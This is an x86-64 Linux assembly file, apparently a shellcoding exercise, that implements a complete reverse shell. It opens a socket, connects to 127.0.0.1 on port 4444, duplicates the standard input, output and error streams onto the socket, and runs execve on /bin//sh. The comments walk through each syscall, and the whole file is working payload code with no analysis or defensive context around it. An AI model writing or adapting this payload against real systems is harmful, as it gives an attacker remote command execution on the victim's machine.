global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 
	xor rax,rax
        mov rdi,rax
        mov rsi,rax
        mov rdx,rax


        add rax, 41
        add rdi, 2
        inc rsi
        syscall
	
	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	
	
	mov dword [rsp-4], 0x0100007f
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], 0x2
	sub rsp, 8


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	xor rax,rax
	mov rdx,rax
	
	add rax, 42
	mov rsi, rsp
	add rdx, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
	xor rax,rax
	mov rsi,rax
	        
	add rax, 33
        syscall
	
	mov rax,rsi
        add rax, 33
        inc rsi
        syscall
	
	xor rax,rax
	mov rsi,rax
        add rax, 33
        add rsi, 2
        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 

